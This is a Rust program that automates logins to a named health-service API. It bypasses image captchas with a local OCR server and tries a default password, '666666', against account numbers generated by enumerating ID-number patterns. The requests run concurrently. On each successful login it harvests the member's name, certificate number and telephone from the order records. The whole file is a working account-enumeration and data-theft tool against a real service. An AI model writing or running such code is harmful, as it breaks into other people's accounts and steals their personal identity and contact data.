use std::{sync::Arc, time::Duration};

use anyhow::Result;
use rand::RngExt;
use reqwest::redirect;
use serde::Deserialize;
use tokio::sync::Semaphore;

struct Client {
    client: reqwest::Client,
}

#[derive(Deserialize)]
struct CaptchaResponse {
    data: CaptchaData,
}

#[derive(Deserialize)]
struct CaptchaData {
    image: String,
    key: String,
}

#[derive(Deserialize)]
struct DdddocrResponse {
    data: DdddocrData,
}

#[derive(Deserialize)]
struct DdddocrData {
    text: String,
}

#[derive(Deserialize)]
struct LoginResponse {
    message: String,
    data: Option<LoginData>,
}

#[derive(Deserialize)]
struct LoginData {
    token: String,
}
// getMemberList

#[derive(Deserialize)]
struct GetMemberListResponse {
    data: Vec<GetMemberListData>,
}

#[derive(Deserialize, Debug)]
struct GetMemberListData {
    name: String,
}

#[derive(Deserialize, Debug)]
struct GetOrderListResponse {
    data: Vec<GetOrderListData>,
}

#[derive(Deserialize, Debug)]
struct GetOrderListData {
    memberName: String,
    certNo: String,
    telephone: String,
}

impl Client {
    fn build() -> Result<Self> {
        // let cert = Certificate::from_pem(&fs::read(
        //     "/Users/terakomari/.mitmproxy/mitmproxy-ca-cert.pem",
        // )?)?;

        let client = reqwest::Client::builder()
            .redirect(redirect::Policy::none())
            .connect_timeout(Duration::from_secs(10))
            .timeout(Duration::from_secs(60))
            // .proxy(Proxy::all("http://127.0.0.1:8080")?)
            // .tls_certs_merge([cert])
            .build()?;

        Ok(Self { client })
    }

    async fn ddddocr(&self, image: &str) -> Result<String> {
        let response: DdddocrResponse = self
            .client
            .post("http://127.0.0.1:8000/ocr")
            .json(&sonic_rs::json!({
                "image":image
            }))
            .send()
            .await?
            .json()
            .await?;

        Ok(response.data.text)
    }

    async fn get_captcha(&self) -> Result<(String, String)> {
        loop {
            let key: String = (0..16)
                .map(|_| char::from(b'0' + rand::rng().random_range(0..10) as u8))
                .collect();
            let key = format!("cup_login_{key}");

            let response = self
                .client
                .get("https://health-api.yhchmo.com/v2/captcha/image")
                .query(&sonic_rs::json!({
                        "key": key,
                        "width": "120",
                        "height": "24",
                }))
                .send()
                .await?
                .text()
                .await?;
            let response: CaptchaResponse = sonic_rs::from_str(&response)?;

            let key = response.data.key;
            let image = response
                .data
                .image
                .strip_prefix("data:image/png;base64,")
                .unwrap();

            let code = self.ddddocr(image).await?;

            if code.len() != 4 || code.chars().any(|ch| ch.is_ascii_alphabetic()) {
                continue;
            } else {
                return Ok((key, code));
            }
        }
    }

    async fn login(&self, account: &str) -> Result<()> {
        loop {
            let (key, verify_code) = self.get_captcha().await?;

            let response: LoginResponse = self
                .client
                .post("https://api.yhchmo.com/v2/cup/login/account")
                .form(&sonic_rs::json!({
                    "account": account,
                    "password": "666666",
                    "verifyCode": verify_code,
                    "imageKey": key,
                    "projectKey": "YHB2312092",
                }))
                .send()
                .await?
                .json()
                .await?;
            let message = response.message;

            if message == "验证码错误" {
                continue;
            } else if message == "登录失败，卡号不存在" {
                //tracing::info!("{account} {message}");
                break;
            } else if message == "登录成功" {
                let token = response.data.unwrap().token;

                let response: GetMemberListResponse = self
                    .client
                    .get("https://api.yhchmo.com/v2/cup/member/getMemberList")
                    .query(&sonic_rs::json!({
                        "token":token,
                        "memberName":"",
                        "serviceUnitId":"17283",
                    }))
                    .send()
                    .await?
                    .json()
                    .await?;
                let name = &response.data[0].name;

                let response: GetOrderListResponse = self
                    .client
                    .get("https://api.yhchmo.com/v2/cup/order/getOrderList")
                    .query(&sonic_rs::json!({
                        "token":token,
                        "status":"0",
                    }))
                    .send()
                    .await?
                    .json()
                    .await?;
                let order = response.data;

                if !order.is_empty() {
                    println!("{account} {name} {order:?}");
                } else {
                    println!("{account} {name}");
                }

                break;
            } else {
                tracing::info!("{account} {message}");
            }
        }

        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let _guard = login::init_log(
        &clap_verbosity_flag::Verbosity::new(4, 0),
        "log",
        env!("CARGO_CRATE_NAME"),
    )?;

    let client = Arc::new(Client::build()?);

    // let accounts = fs::read_to_string("account.txt")?;
    // for account in accounts.lines() {
    //     client.login(account.trim()).await?;
    // }

    let DAYS_IN_MONTH = [0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let CHECK_CODES = "0123456789X";
    let semaphore = Arc::new(Semaphore::new(16));

    for y in 0..10 {
        for m in 1..13 {
            for d in 1..DAYS_IN_MONTH[m] + 1 {
                for seq in 1..150 {
                    let base = format!("{y}{m:02}{d:02}{seq:03}");
                    for c in CHECK_CODES.chars() {
                        let account = format!("{base}{c}");

                        let client = Arc::clone(&client);
                        let permit = semaphore.clone().acquire_owned().await.unwrap();
                        tokio::spawn(async move {
                            client.login(&account).await?;
                            drop(permit);
                            anyhow::Ok(())
                        });
                    }
                }
            }
        }
    }

    Ok(())
}
